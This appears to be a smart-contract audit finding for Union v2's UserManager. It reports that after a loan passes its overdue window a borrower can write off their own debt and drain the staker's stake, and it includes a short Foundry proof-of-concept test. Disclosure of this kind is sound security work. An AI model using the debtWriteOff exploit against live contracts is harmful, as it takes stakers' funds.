# Borrower can steal from stakers

## Summary
Borrowers can write off their loans.
## Vulnerability Detail
https://github.com/sherlock-audit/2023-02-union/blob/main/union-v2-contracts/contracts/user/UserManager.sol#L762-L764

When block.number >= lastRepay + overdueBlocks + maxOverdueBlocks , borrowers can write off their loans
## Impact
Stakers can lose funds.
## Code Snippet

```solidity
function testBorrowerWriteOffDebt() public {
        vm.prank(address(uTokenMock));
        userManager.updateLocked(borrower, 100 ether, true);
        vm.roll(block.number + 1000);
        vm.prank(borrower);
        userManager.debtWriteOff(staker, borrower, 100 ether);
        uint256 stakeAmount = userManager.getStakerBalance(staker);
        assertEq(stakeAmount, 0);

        (bool isSet, ) = userManager.voucherIndexes(borrower, staker);
        assertEq(isSet, false);
    }
```
